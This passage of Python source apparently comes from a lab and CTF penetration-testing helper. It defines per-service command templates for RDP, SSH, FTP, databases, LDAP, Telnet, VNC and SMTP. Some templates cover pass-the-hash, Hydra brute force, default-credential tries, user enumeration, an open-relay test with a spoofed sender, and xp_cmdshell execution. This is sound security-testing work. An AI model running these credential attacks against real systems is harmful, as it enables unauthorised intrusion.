            "actions": [
                {"id":"connect",     "label":"Connect with password",
                 "what":"Opens a GUI xfreerdp window. Clipboard sharing is "
                        "enabled by default.",
                 "tpl":"xfreerdp /v:{host}:{port} /u:{user} /p:'{pass}' {rdp_flags} +clipboard /dynamic-resolution",
                 "mode":"auth", "needs":[]},
                {"id":"connect_hash","label":"Connect with NTLM hash (PtH)",
                 "what":"Pass-the-hash RDP. Requires Restricted Admin mode "
                        "on the target (usually off).",
                 "tpl":"xfreerdp /v:{host}:{port} /u:{user} /pth:{hash} {rdp_flags} /restricted-admin",
                 "mode":"hash", "needs":[]},
                {"id":"check_nla",   "label":"Check if NLA is required",
                 "what":"Non-invasive nmap script that probes RDP config.",
                 "tpl":"nmap -p {port} --script rdp-ntlm-info,rdp-enum-encryption {host}",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {},
            "flags": {
                "/v":                 "Target host:port",
                "/u":                 "Username",
                "/p":                 "Password",
                "/pth":               "NTLM hash (pass-the-hash, needs RestrictedAdmin)",
                "+clipboard":         "Enable clipboard sharing",
                "/dynamic-resolution":"Resize window dynamically",
                "/restricted-admin":  "Required for PtH",
            },
            "expect": "A graphical Windows desktop login screen.",
            "errors": {
                "ERRCONNECT_LOGON_FAILURE":
                    "Wrong username or password.",
                "ERRCONNECT_CONNECT_CANCELLED":
                    "Target closed the connection — often NLA/cert mismatch.",
                "ERRCONNECT_SSL_CONNECT_FAILED":
                    "TLS handshake failed — add '/cert:ignore'.",
                "NLA":
                    "Restricted Admin / PtH not allowed — need cleartext creds.",
            },
        },

        "ssh": {
            "icon":  "🔑",
            "title": "SSH — Secure Shell",
            "desc":  ("Encrypted remote shell, port 22 default. Supports "
                      "password auth OR public-key auth (most hardened "
                      "hosts). OpenSSH is the common server."),
            "actions": [
                {"id":"password",    "label":"Password authentication",
                 "what":"Connects and prompts for password interactively. "
                        "Don't put the password in the command line — "
                        "openssh ignores it anyway.",
                 "tpl":f"ssh {{compat}} {_SSH_NOPROMPT} -p {{port}} {{user}}@{{host}}",
                 "mode":"auth", "needs":[]},
                {"id":"keyfile",     "label":"Private-key authentication",
                 "what":"Use an SSH private key. chmod 600 the keyfile first "
                        "or ssh will refuse it.",
                 "tpl":f"ssh {{compat}} {_SSH_NOPROMPT} -p {{port}} -i {{keyfile}} {{user}}@{{host}}",
                 "mode":"key", "needs":["keyfile"]},
                {"id":"sshpass_pw",  "label":"Non-interactive password (sshpass)",
                 "what":"Passes the password via sshpass — useful for scripts. "
                        "Requires 'sshpass' to be installed.",
                 "tpl":f"sshpass -p '{{pass}}' ssh {{compat}} {_SSH_NOPROMPT} -p {{port}} {{user}}@{{host}}",
                 "mode":"auth", "needs":[]},
                {"id":"enum_auth",   "label":"Enumerate accepted auth methods",
                 "what":"No login attempt — just asks the server which auth "
                        "types it accepts (password / publickey / keyboard).",
                 "tpl":f"ssh {{compat}} {_SSH_NOPROMPT} -o PreferredAuthentications=none -p {{port}} {{user}}@{{host}}",
                 "mode":"auth", "needs":[]},
            ],
            "extras": {
                "keyfile": {"label":"Private key path", "default":"~/.ssh/id_rsa",
                            "hint":"e.g. ~/.ssh/id_rsa or /tmp/stolen_key"},
            },
            "flags": {
                "-p":    "Port (default 22)",
                "-i":    "Identity file (private key)",
                "-o":    "Set an ssh_config option inline",
                "StrictHostKeyChecking=no": "Accept unknown host keys (CTF only)",
                "PreferredAuthentications": "Restrict which auth method to try",
                "-oHostKeyAlgorithms=+ssh-rsa": "Legacy compat — accept ssh-rsa (SHA-1) host keys (auto-added on legacy/unknown targets)",
                "-oKexAlgorithms=+diffie-hellman-group1-sha1": "Legacy compat — weak DH groups (auto-added on legacy/unknown targets)",
                "-oCiphers=+aes128-cbc,3des-cbc": "Legacy compat — CBC ciphers (auto-added on legacy/unknown targets)",
                "-oPubkeyAcceptedAlgorithms=+ssh-rsa": "Legacy compat — accept ssh-rsa client keys (auto-added on legacy/unknown targets)",
            },
            "expect": "A shell prompt like 'user@host:~$'.",
            "errors": {
                "Permission denied (publickey)":
                    "Server requires a key — password auth is disabled.",
                "Permission denied (password)":
                    "Wrong password — or password auth disabled.",
                "Host key verification failed":
                    "Clear with: ssh-keygen -R {host}",
                "Connection refused":
                    "SSH not running / wrong port / firewall.",
                "kex_exchange_identification":
                    "Server rejected the connection — fail2ban ban, likely.",
                "no matching host key type found":
                    "Target offers only legacy host keys (ssh-rsa/dss). HAWK "
                    "usually auto-adds compat flags — if you see this, the "
                    "target was misclassified as 'modern'. Switch the "
                    "generation radio to 'Force legacy' at the top of this "
                    "dialog.",
                "no matching key exchange method":
                    "Target uses an ancient KEX (dh-group1). Switch to "
                    "'Force legacy' — HAWK will add -oKexAlgorithms=+dh-group1-sha1.",
                "no matching cipher found":
                    "Target only offers old CBC ciphers (aes128-cbc / 3des-cbc). "
                    "Switch to 'Force legacy' to auto-add them.",
            },
        },

        "ftp": {
            "icon":  "📂",
            "title": "FTP — File Transfer Protocol",
            "desc":  ("Plaintext file transfer. Port 21 control, data on 20 "
                      "(active) or random high port (passive). Many CTF "
                      "boxes allow anonymous read."),
            "actions": [
                {"id":"anon",        "label":"Anonymous login",
                 "what":"Logs in as user 'anonymous' with any email as "
                        "password, then drops you at the ftp> prompt "
                        "already authenticated — type 'ls', 'get <file>', "
                        "'pwd', 'binary' as usual.  Passive mode is enabled "
                        "so the data channel works behind NAT/firewalls.",
                 # Pipe the auth commands into ftp(1) and keep stdin alive
                 # with `cat` so the user can keep typing interactively.
                 # See _CONNECT_CMDS_ANON comment for the rationale.
                 "tpl":("{ printf 'user anonymous anonymous@\\n"
                        "passive\\n'; cat; } | ftp -nv {host} {port}"),
                 "mode":"anon", "needs":[]},
                {"id":"auth_creds",  "label":"Connect with known credentials",
                 "what":("Logs in non-interactively with the user/password "
                         "you supply — drops you at the ftp> prompt "
                         "already authenticated.  Same printf-pipe pattern "
                         "as the anonymous action, but with explicit "
                         "credentials.  Pick a credential from the store "
                         "above, or choose 'Type credentials manually' to "
                         "type your own."),
                 "tpl":("{ printf 'user {user} {pass}\\n"
                        "passive\\n'; cat; } | ftp -nv {host} {port}"),
                 "mode":"auth", "needs":[]},
                {"id":"auth",        "label":"Authenticated login (interactive)",
                 "what":("Regular login. FTP transmits credentials IN "
                         "CLEARTEXT.  You will land at the ftp> prompt "
                         "un-authenticated — type:\n"
                         "    user <USERNAME>\n"
                         "    <password when asked>\n"
                         "    passive\n"
                         "then use 'ls', 'get <file>', etc."),
                 "tpl":"ftp -n {host} {port}",
                 "mode":"auth", "needs":[]},
                {"id":"list_anon",   "label":"List root directory (anon, one-shot)",
                 "what":"curl-based non-interactive listing. Uses explicit "
                        "anonymous:anonymous credentials so restrictive "
                        "FTP daemons (ProFTPD on Metasploitable port 2121, "
                        "Pure-FTPd, IIS-FTP) accept the login — curl's "
                        "default `ftp@example.com` password gets rejected "
                        "by some configs with 530 Login incorrect.",
                 "tpl":"curl -v --user anonymous:anonymous ftp://{host}:{port}/",
                 "mode":"anon", "needs":[]},
                {"id":"download_anon","label":"Download file (anonymous)",
                 "what":"Pulls a single file without interactive session.",
                 "tpl":"curl -v --user anonymous:anonymous "
                       "ftp://{host}:{port}/{path} -o ./{path}",
                 "mode":"anon", "needs":["path"]},
            ],
            "extras": {
                "path": {"label":"Remote file path", "default":"",
                         "hint":"e.g. pub/readme.txt"},
            },
            "flags": {
                "-n":   "Don't auto-login — lets you type 'user'/'pass' manually",
                "-v":   "(curl) verbose, shows control channel",
                "ftp://": "URL scheme — curl handles passive mode automatically",
            },
            "expect": ("Anonymous: ftp> prompt already logged in ('230 Login "
                       "successful.' scrolled past) — use 'ls', 'get file', "
                       "'binary', 'passive'.\n"
                       "Authenticated: ftp> prompt un-authenticated — type "
                       "'user <name>' then the password when prompted."),
            "errors": {
                "530 Please login with USER and PASS":
                    "You're at ftp> but not logged in — type 'user anonymous' "
                    "then press ENTER at the Password: prompt.",
                "530 Login incorrect":
                    "Credentials rejected — try 'anonymous' with any email.",
                "425 Can't open data connection":
                    "Passive/active mismatch — type 'passive' at the ftp> "
                    "prompt and retry the command.",
                "Can't bind for data connection":
                    "Stuck TIME_WAIT socket on the local active-FTP port — "
                    "type 'passive' and retry.",
                "Connection refused":
                    "FTP not running or blocked.",
            },
        },

        "http": {
            "icon":  "🌐",
            "title": "HTTP — Web Server",
            "desc":  ("Web protocol — ports 80, 8080, 8000, etc. First "
                      "contact usually is a HEAD request to fingerprint "
                      "the server, then open a browser."),
            "actions": [
                {"id":"head",        "label":"Fetch headers only (HEAD)",
                 "what":"curl -I — no body, just response headers. Shows "
                        "Server:, X-Powered-By:, redirects, cookies.",
                 "tpl":"curl -I -v http://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"get",         "label":"Full GET (show body)",
                 "what":"Full request, prints the HTML to terminal.",
                 "tpl":"curl -v http://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"browser",     "label":"Open in default browser",
                 "what":"Launches Firefox/Chromium on the URL.",
                 "tpl":"xdg-open http://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"basic_auth",  "label":"HTTP Basic auth request",
                 "what":("Validates the typed credentials against the URL. "
                         "HAWK runs TWO probes: probe-A (no auth) detects "
                         "whether the endpoint actually requires Basic auth "
                         "(401 + WWW-Authenticate: Basic), and probe-B sends "
                         "the typed credentials.  Without probe-A, a public "
                         "endpoint (Apache root, CTF homepage, public "
                         "/index.html) returns 200 OK for ANY request "
                         "including credentialed ones — leading to a false "
                         "positive 'credentials valid' verdict.  The two "
                         "probes give HAWK a reliable verdict."),
                 "tpl":("echo '=== HAWK probe-A (no auth) ==='; "
                        "curl -sS -o /dev/null -D - "
                        "http://{host}:{port}{path}; "
                        "echo '=== HAWK probe-B (typed creds, verbose) ==='; "
                        "curl -v -u '{user}:{pass}' "
                        "http://{host}:{port}{path}"),
                 "mode":"auth", "needs":["path"]},
                {"id":"whatweb",     "label":"Fingerprint with whatweb",
                 "what":"Identifies CMS, frameworks, versions.",
                 "tpl":"whatweb -v http://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
            ],
            "extras": {
                "path": {"label":"URL path", "default":"/",
                         "hint":"e.g. /  or  /admin/login.php"},
            },
            "flags": {
                "-I":  "HEAD only (no body) — fast fingerprinting",
                "-v":  "Verbose — show full request + response headers",
                "-u":  "HTTP Basic auth (user:pass)",
                "-k":  "(https only) ignore cert errors",
                "-L":  "Follow redirects",
            },
            "expect": ("'HTTP/1.1 200 OK' + Server header, or 301/302 "
                       "redirect, or 401 if auth required."),
            "errors": {
                "Connection refused":
                    "Web server not listening on that port.",
                "401 Unauthorized":
                    "Needs Basic auth — use 'basic_auth' action.",
                "403 Forbidden":
                    "Server refuses that path — try a different one.",
                "SSL":
                    "For HTTPS add -k to ignore cert errors.",
            },
        },

        "https": {
            "icon":  "🔒",
            "title": "HTTPS — TLS Web Server",
            "desc":  ("HTTP over TLS. Port 443 default. Same workflow as "
                      "HTTP but -k ignores cert errors (self-signed / "
                      "lab certs)."),
            "actions": [
                {"id":"head",       "label":"Fetch headers (HEAD + -k)",
                 "what":"Headers only, ignoring cert validation.",
                 "tpl":"curl -I -vk https://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"get",        "label":"Full GET",
                 "what":"Full body, ignoring certs.",
                 "tpl":"curl -vk https://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"browser",    "label":"Open in default browser",
                 "what":"Browser may warn about the cert — accept and proceed.",
                 "tpl":"xdg-open https://{host}:{port}{path}",
                 "mode":"anon", "needs":["path"]},
                {"id":"cert_info",  "label":"Inspect TLS certificate",
                 "what":"Shows issuer, CN, SANs, validity — great for "
                        "finding hidden vhosts in the SAN field.",
                 "tpl":"openssl s_client -connect {host}:{port} -servername {host} </dev/null 2>/dev/null | openssl x509 -noout -text",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {
                "path": {"label":"URL path", "default":"/",
                         "hint":"e.g. / or /admin"},
            },
            "flags": {
                "-k":  "Insecure — skip TLS verification",
                "-I":  "HEAD only",
                "-v":  "Verbose",
                "-servername": "SNI — required for vhosts behind the same IP",
            },
            "expect": "Same as HTTP — or cert details if inspecting TLS.",
            "errors": {
                "SSL certificate problem":
                    "Add -k to skip verification (labs use self-signed).",
                "TLS handshake":
                    "Port may actually be HTTP, not HTTPS — try /head.",
            },
        },

        "mysql": {
            "icon":  "🐬",
            "title": "MySQL / MariaDB",
            "desc":  ("RDBMS — port 3306 default. Try 'root' with empty "
                      "password on dev/lab boxes. Newer hosts often bind "
                      "to 127.0.0.1 only."),
            "actions": [
                {"id":"connect",    "label":"Interactive client (prompts for pass)",
                 "what":"Opens mysql> prompt. Safer than putting pw on cmdline.",
                 "tpl":"mysql {compat} -h {host} -P {port} -u {user} -p",
                 "mode":"auth", "needs":[]},
                {"id":"connect_pw", "label":"Non-interactive (pass on cmdline)",
                 "what":"Embeds password. WARNING: visible in 'ps aux'.",
                 "tpl":"mysql {compat} -h {host} -P {port} -u {user} -p'{pass}'",
                 "mode":"auth", "needs":[]},
                {"id":"list_dbs",   "label":"List databases",
                 "what":"Runs SHOW DATABASES and exits.",
                 "tpl":"mysql {compat} -h {host} -P {port} -u {user} -p'{pass}' -e 'SHOW DATABASES;'",
                 "mode":"auth", "needs":[]},
                {"id":"empty_root", "label":"Try root with empty password",
                 "what":"CTF classic — many vulnerable boxes leave this open.",
                 "tpl":"mysql {compat} -h {host} -P {port} -u root -e 'SHOW DATABASES;'",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {},
            "flags": {
                "-h":  "Host",
                "-P":  "Port (uppercase P — lowercase -p is password!)",
                "-u":  "Username",
                "-p":  "Password (no space = embed; space = prompt)",
                "-e":  "Execute SQL and exit",
                "--skip-ssl": "Legacy compat — skip TLS handshake for MySQL 5.x / MariaDB servers that don't speak modern TLS (auto-added on legacy/unknown targets)",
            },
            "expect": "'mysql>' prompt or a table of databases.",
            "errors": {
                "ERROR 1045":
                    "Access denied — wrong password.",
                "ERROR 1130":
                    "Host not allowed — the user has IP restrictions.",
                "ERROR 2003":
                    "Can't connect — server not listening on that IP.",
                "ERROR 2026":
                    "TLS/SSL handshake failure — server is too old for "
                    "modern TLS.  HAWK usually auto-adds --skip-ssl "
                    "for legacy/unknown targets; if you see this error the "
                    "target was classified 'modern'.  Switch the generation "
                    "radio at the top of this dialog to 'Force legacy'.",
                "TLS/SSL error":
                    "Same as ERROR 2026 above — server doesn't speak modern "
                    "TLS.  Switch to 'Force legacy' to auto-add --skip-ssl.",
                "wrong version number":
                    "OpenSSL handshake parse error — server replied in "
                    "plaintext while the client was expecting a TLS "
                    "record.  Force legacy to disable SSL.",
                "unknown variable 'ssl-mode":
                    "You're using MariaDB client (Kali 2025 default) which "
                    "doesn't know MySQL-8 syntax.  HAWK's current compat "
                    "flag is --skip-ssl (portable across both clients) — "
                    "if you see this, update HAWK to latest.",
            },
        },

        "postgresql": {
            "icon":  "🐘",
            "title": "PostgreSQL",
            "desc":  ("RDBMS — port 5432. Needs a database name (PG won't "
                      "let you connect without one — default is 'postgres')."),
            "actions": [
                {"id":"connect",    "label":"Interactive psql",
                 "what":"Opens psql prompt. Will ask for password interactively.",
                 "tpl":"{compat} psql -h {host} -p {port} -U {user} -d {database}",
                 "mode":"auth", "needs":["database"]},
                {"id":"list_dbs",   "label":"List databases",
                 "what":"Runs \\l and exits.",
                 "tpl":"{compat} PGPASSWORD='{pass}' psql -h {host} -p {port} -U {user} -d {database} -c '\\l'",
                 "mode":"auth", "needs":["database"]},
            ],
            "extras": {
                "database": {"label":"Database", "default":"postgres",
                             "hint":"Usually 'postgres' for the admin DB"},
            },
            "flags": {
                "-h":    "Host",
                "-p":    "Port",
                "-U":    "Username",
                "-d":    "Database name (required!)",
                "-c":    "Execute a single command",
                "PGPASSWORD": "Env var — cleaner than putting pw on cmdline",
                "PGSSLMODE=disable": "Legacy compat — skip SSL for PG 8.x / older servers that only do TLSv1 (auto-added on legacy/unknown targets)",
            },
            "expect": "'postgres=#' prompt or a list of databases.",
            "errors": {
                "password authentication failed":
                    "Wrong password.",
                "database ... does not exist":
                    "Try 'postgres' as the database name.",
                "no pg_hba.conf entry":
                    "Server config blocks your IP — move to a vhost on the box.",
                "SSL error: unsupported protocol":
                    "Server only speaks TLS <1.2 (PG 8.x / ancient). HAWK "
                    "auto-adds PGSSLMODE=disable on legacy/unknown targets. "
                    "If you see this, the target was classified 'modern'. "
                    "Switch the radio at the top to 'Force legacy'.",
                "server does not support SSL":
                    "PG server has SSL disabled entirely — libpq in "
                    "sslmode=prefer falls back automatically, but some "
                    "old psql builds don't. Force legacy to emit "
                    "PGSSLMODE=disable explicitly.",
            },
        },

        "mssql": {
            "icon":  "🗄️",
            "title": "MSSQL — SQL Server",
            "desc":  ("Microsoft SQL Server — port 1433. Can also authenticate "
                      "with domain creds (Windows auth). xp_cmdshell is "
                      "the classic RCE if 'sa' is compromised."),
            "actions": [
                {"id":"sql_auth",   "label":"SQL authentication",
                 "what":"Impacket mssqlclient — login with SQL user/pass.",
                 "tpl":"impacket-mssqlclient {user}:'{pass}'@{host} -port {port}",
                 "mode":"auth", "needs":[]},
                {"id":"win_auth",   "label":"Windows authentication",
                 "what":"Uses domain creds (DOMAIN/user).",
                 "tpl":"impacket-mssqlclient {domain}/{user}:'{pass}'@{host} -port {port} -windows-auth",
                 "mode":"auth", "needs":["domain"]},
                {"id":"hash_auth",  "label":"Pass-the-hash (Windows auth)",
                 "what":"NTLM hash via impacket.",
                 "tpl":"impacket-mssqlclient {domain}/{user}@{host} -port {port} -hashes :{hash} -windows-auth",
                 "mode":"hash", "needs":["domain"]},
                {"id":"check_creds","label":"Validate creds (netexec)",
                 "what":"Fast auth check.",
                 "tpl":"netexec mssql {host} -u {user} -p '{pass}'",
                 "mode":"auth", "needs":[]},
            ],
            "extras": {
                "domain": {"label":"Windows domain", "default":"WORKGROUP",
                           "hint":"AD domain name (NETBIOS style, e.g. CORP)"},
            },
            "flags": {
                "-port":         "TCP port (default 1433)",
                "-windows-auth": "Use NTLM instead of SQL auth",
                "-hashes":       ":NTLMHASH (note the colon prefix)",
            },
            "expect": "'SQL>' prompt — try 'enable_xp_cmdshell' then 'xp_cmdshell whoami'.",
            "errors": {
                "Login failed":
                    "Wrong creds / account disabled.",
                "Named Pipes Provider":
                    "Server not reachable on TCP — may be listening on named pipes only.",
            },
        },

        "ldap": {
            "icon":  "📇",
            "title": "LDAP — Directory Service",
            "desc":  ("Directory protocol, port 389 (plain) / 636 (LDAPS). "
                      "On AD DCs it exposes huge amounts of info — often "
                      "reads anonymous."),
            "actions": [
                {"id":"anon_base",  "label":"Anonymous bind (base info)",
                 "what":"No creds — pulls RootDSE which leaks naming contexts "
                        "and server info.",
                 "tpl":"ldapsearch -x -H ldap://{host}:{port} -s base",
                 "mode":"anon", "needs":[]},
                {"id":"anon_dump",  "label":"Anonymous full dump",
                 "what":"Tries to pull everything the server gives anonymously.",
                 "tpl":"ldapsearch -x -H ldap://{host}:{port} -b '{basedn}'",
                 "mode":"anon", "needs":["basedn"]},
                {"id":"auth_dump",  "label":"Authenticated dump",
                 "what":"Simple bind with user/password.",
                 "tpl":"ldapsearch -x -H ldap://{host}:{port} -D '{binddn}' -w '{pass}' -b '{basedn}'",
                 "mode":"auth", "needs":["binddn","basedn"]},
                {"id":"ad_users",   "label":"List AD users (netexec)",
                 "what":"Dumps users from an AD DC.",
                 "tpl":"netexec ldap {host} -u {user} -p '{pass}' --users",
                 "mode":"auth", "needs":[]},
            ],
            "extras": {
                "basedn": {"label":"Base DN", "default":"",
                           "hint":"e.g. DC=corp,DC=local"},
                "binddn": {"label":"Bind DN", "default":"",
                           "hint":"Full DN like CN=admin,DC=corp,DC=local"},
            },
            "flags": {
                "-x":   "Simple auth (no SASL)",
                "-H":   "LDAP URI (ldap:// or ldaps://)",
                "-b":   "Base DN to search from",
                "-s":   "Scope: base / one / sub",
                "-D":   "Bind DN",
                "-w":   "Bind password",
            },
            "expect": ("Directory entries in LDIF format. RootDSE should "
                       "show 'defaultNamingContext: DC=...' — that's your basedn."),
            "errors": {
                "Invalid credentials":
                    "Wrong DN or password.",
                "result: 32 No such object":
                    "Base DN is wrong or doesn't exist.",
                "Operations error":
                    "AD requires a real bind — anonymous not allowed here.",
                "Can't contact LDAP server":
                    "Port/host unreachable.",
            },
        },

        "redis": {
            "icon":  "🔴",
            "title": "Redis",
            "desc":  ("In-memory key-value store, port 6379. Default install "
                      "often allows unauthenticated access. INFO and CONFIG "
                      "reveal the world."),
            "actions": [
                {"id":"connect",    "label":"Interactive redis-cli (anon)",
                 "what":"Most Redis deployments have no auth — just connect.",
                 "tpl":"redis-cli -h {host} -p {port}",
                 "mode":"anon", "needs":[]},
                {"id":"auth",       "label":"redis-cli with password",
                 "what":"Use if requirepass is set.",
                 "tpl":"redis-cli -h {host} -p {port} -a '{pass}'",
                 "mode":"auth", "needs":[]},
                {"id":"info",       "label":"INFO dump (one-shot)",
                 "what":"Prints server config, memory, role — good recon.",
                 "tpl":"redis-cli -h {host} -p {port} INFO",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {},
            "flags": {
                "-h":  "Host",
                "-p":  "Port",
                "-a":  "Auth password (Redis 6+ supports ACL users with --user)",
            },
            "expect": "'host:port>' prompt. Try 'INFO', 'CONFIG GET *', 'KEYS *'.",
            "errors": {
                "NOAUTH":        "Password required — use 'auth' action.",
                "WRONGPASS":     "Bad password.",
                "Connection refused": "Not listening on that port.",
            },
        },

        "mongodb": {
            "icon":  "🍃",
            "title": "MongoDB",
            "desc":  ("Document DB, port 27017. Old versions bind to 0.0.0.0 "
                      "with no auth — instant win."),
            "actions": [
                {"id":"connect",    "label":"mongosh (anonymous)",
                 "what":"Unauthenticated shell.",
                 "tpl":"mongosh mongodb://{host}:{port}",
                 "mode":"anon", "needs":[]},
                {"id":"auth",       "label":"mongosh with credentials",
                 "what":"Authenticated against admin DB by default.",
                 "tpl":"mongosh 'mongodb://{user}:{pass}@{host}:{port}/admin'",
                 "mode":"auth", "needs":[]},
            ],
            "extras": {},
            "flags": {
                "mongodb://": "Connection URI",
                "/admin":     "Authentication database",
            },
            "expect": "'test>' prompt. Try 'show dbs', 'use <db>', 'db.<col>.find()'.",
            "errors": {
                "Authentication failed":     "Bad creds or wrong authdb.",
                "MongoServerSelectionError": "Can't reach the server.",
            },
        },

        "telnet": {
            "icon":  "📟",
            "title": "Telnet",
            "desc":  ("Plaintext remote shell. Port 23. Rare outside of "
                      "embedded devices, IoT, and ancient Cisco gear. "
                      "Everything travels in cleartext — sniff with Wireshark."),
            "actions": [
                {"id":"connect",    "label":"Connect (interactive)",
                 "what":"Opens a raw telnet session — type your username and "
                        "password at the login prompt. Everything goes in cleartext.",
                 "tpl":"telnet {host} {port}",
                 "mode":"anon", "needs":[]},
                {"id":"auth_creds", "label":"Connect with known credentials",
                 "what":"Pipes the username and password into telnet then "
                        "leaves stdin attached so you can keep typing once "
                        "you're logged in. Drops you at the shell with the "
                        "creds already accepted — same idea as the FTP "
                        "anonymous action. Everything still travels in "
                        "cleartext.",
                 # Two short sleeps so the login prompt has time to render
                 # before each line is sent — telnet is famously timing-
                 # sensitive on stdin.  `cat` keeps stdin alive after the
                 # automated login so the user can keep typing commands.
                 "tpl":("{ sleep 1; printf '{user}\\n'; sleep 1; "
                        "printf '{pass}\\n'; cat; } | telnet {host} {port}"),
                 "mode":"auth", "needs":[]},
                {"id":"brute",      "label":"Brute force (Hydra)",
                 "what":"Tries username/password combinations from a wordlist. "
                        "Default: Metasploit unix lists (covers most common default "
                        "creds — root/root, msfadmin/msfadmin, admin/admin, etc.). "
                        "Change the paths below to use any other wordlist.",
                 "tpl":"hydra -L {users_wl} -P {pass_wl} "
                       "-s {port} -t 4 -f {host} telnet",
                 "mode":"anon", "needs":["users_wl", "pass_wl"]},
                {"id":"brute_creds","label":"Validate credentials (Hydra)",
                 "what":"Single user/pass yes/no check via hydra -t 1.  "
                        "Useful as a quick sanity verification.  For an "
                        "actual interactive session pick 'Connect with "
                        "known credentials' above.",
                 "tpl":"hydra -l {user} -p '{pass}' -s {port} -t 1 {host} telnet",
                 "mode":"auth", "needs":[]},
                {"id":"no_auth",    "label":"Try empty credentials (no password)",
                 "what":"Some devices (routers, switches, IoT) accept a blank "
                        "username and/or password — just press Enter at the prompt. "
                        "This uses nmap to check if the server responds to empty creds.",
                 "tpl":"nmap -p {port} --script telnet-brute "
                       "--script-args userdb=/dev/null,passdb=/dev/null {host}",
                 "mode":"anon", "needs":[]},
                {"id":"banner",     "label":"Banner grab (nmap)",
                 "what":"Grabs the telnet banner and checks for NTLM info without "
                        "attempting a login. Shows the server announcement message.",
                 "tpl":"nmap -p {port} --script banner,telnet-ntlm-info {host}",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {
                "users_wl": {
                    "label":   "Users wordlist",
                    "default": "/usr/share/wordlists/metasploit/unix_users.txt",
                    "hint":    "e.g. /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
                },
                "pass_wl": {
                    "label":   "Passwords wordlist",
                    "default": "/usr/share/wordlists/metasploit/unix_passwords.txt",
                    "hint":    "e.g. /usr/share/wordlists/rockyou.txt",
                },
            },
            "flags": {
                "-L": "Username wordlist file",
                "-P": "Password wordlist file",
                "-l": "Single username",
                "-p": "Single password",
                "-s": "Port (when not the default)",
                "-t": "Parallel threads (keep low for telnet — 4 is safe)",
                "-f": "Stop after first valid credential found",
            },
            "expect": "Login prompt. Common default creds: msfadmin/msfadmin, "
                      "user/user, root/root, admin/admin, cisco/cisco.",
            "errors": {
                "Connection refused":  "Service not running on that port.",
                "Connection closed":   "Server closed immediately — banner-only or max connections reached.",
                "[ERROR] Not an FTP protocol": "Hydra auto-detection failed — make sure the port is actually telnet.",
            },
        },

        "vnc": {
            "icon":  "👁️",
            "title": "VNC — Remote Framebuffer",
            "desc":  ("Graphical remote desktop. Ports 5900+. Auth is often "
                      "a single shared password (no username)."),
            "actions": [
                {"id":"connect",    "label":"vncviewer (prompts for pass)",
                 "what":"Opens a VNC viewer window.",
                 "tpl":"vncviewer {host}::{port}",
                 "mode":"anon", "needs":[]},
                {"id":"check_nla",  "label":"Enumerate VNC auth type",
                 "what":"nmap script — shows if no password is required.",
                 "tpl":"nmap -p {port} --script vnc-info,realvnc-auth-bypass {host}",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {},
            "flags": {
                "host::port": "Double-colon syntax = raw TCP port (not display number)",
            },
            "expect": "A graphical framebuffer window.",
            "errors": {
                "Authentication failure": "Wrong password.",
                "Connection refused":     "No server on that port.",
            },
        },

        "smtp": {
            "icon":  "📧",
            "title": "SMTP — Mail Submission",
            "desc":  ("Email server, port 25/465/587. Useful for user "
                      "enumeration via VRFY/EXPN, or relay abuse."),
            "actions": [
                {"id":"banner",     "label":"Grab SMTP banner + EHLO",
                 "what":"swaks in test mode — shows the full EHLO exchange "
                        "(banner, capabilities, STARTTLS, AUTH methods).",
                 "tpl":"swaks --to test@{host} --server {host}:{port}",
                 "mode":"anon", "needs":[]},
                {"id":"vrfy",       "label":"VRFY user enumeration (wordlist)",
                 "what":"Walks a username wordlist via SMTP VRFY. Old Postfix "
                        "and Sendmail servers leak whether each user exists. "
                        "Edit the wordlist path below to use a different list.",
                 "tpl":"smtp-user-enum -M VRFY -U {users_wl} -t {host} -p {port}",
                 "mode":"anon", "needs":["users_wl"]},
                {"id":"vrfy_single","label":"VRFY single username",
                 "what":"Tests one specific username — useful when you already "
                        "have a candidate from another tool. Type the username "
                        "in the field below.",
                 "tpl":"smtp-user-enum -M VRFY -u {single_user} -t {host} -p {port}",
                 "mode":"anon", "needs":["single_user"]},
                {"id":"open_relay", "label":"Open-relay test",
                 "what":"Attempts to send a mail to an external address. "
                        "Postfix/Exim with default config will refuse — that "
                        "is the SAFE result. Acceptance = critical finding.",
                 "tpl":"swaks --to external@example.com --from spoofed@{host} --server {host}:{port}",
                 "mode":"anon", "needs":[]},
            ],
            "extras": {
                "users_wl": {
                    "label":   "Users wordlist",
                    "default": "/usr/share/wordlists/metasploit/unix_users.txt",
                    "hint":    "Path to a username wordlist (one user per line)",
                },
                "single_user": {
                    "label":   "Single username",
                    "default": "root",
                    "hint":    "e.g. root, admin, postfix, msfadmin, postmaster",
                },
            },
            "flags": {
                "--to":   "Recipient",
                "--from": "Envelope sender",
                "--server": "SMTP server host:port",
                "-M":     "(smtp-user-enum) method: VRFY / EXPN / RCPT",
            },
            "expect": "'220 <banner>' then the server's EHLO capabilities.",
            "errors": {
                "502 Command not implemented": "VRFY disabled — try EXPN or RCPT.",
                "550": "Relay denied — server is not an open relay (good).",
            },
        },
    }

    # Aliases so different nmap labels resolve to the same profile
    _PROFILE_ALIASES = {
        "microsoft-ds": "smb",
        "netbios-ssn":  "smb",
        "ms-wbt-server":"rdp",
        "ms-sql-s":     "mssql",
        "http-proxy":   "http",
        "ssl/http":     "https",
        "http-alt":     "http",
    }

    # ─── Extended port → service map ─────────────────────────────────────────
    # Includes well-known ports AND common alternative ports we see in the
    # wild (CTF labs, custom installs, port-knocked services, IoT devices).
    # Used as a fallback when nmap doesn't return a recognised service name
    # (e.g. "tcpwrapped", "unknown", or a fingerprint scan was skipped).
    _PORT_SERVICE_MAP = {
        # FTP family
        21:    "ftp",  20:    "ftp",
        2121:  "ftp",  2221:  "ftp",  8021:  "ftp",  990:   "ftp",
        # SSH family
        22:    "ssh",  2222:  "ssh",  22222: "ssh",
        # Telnet
        23:    "telnet",  2323: "telnet",
        # SMTP family
        25:    "smtp", 465:   "smtp", 587:   "smtp", 2525:  "smtp",
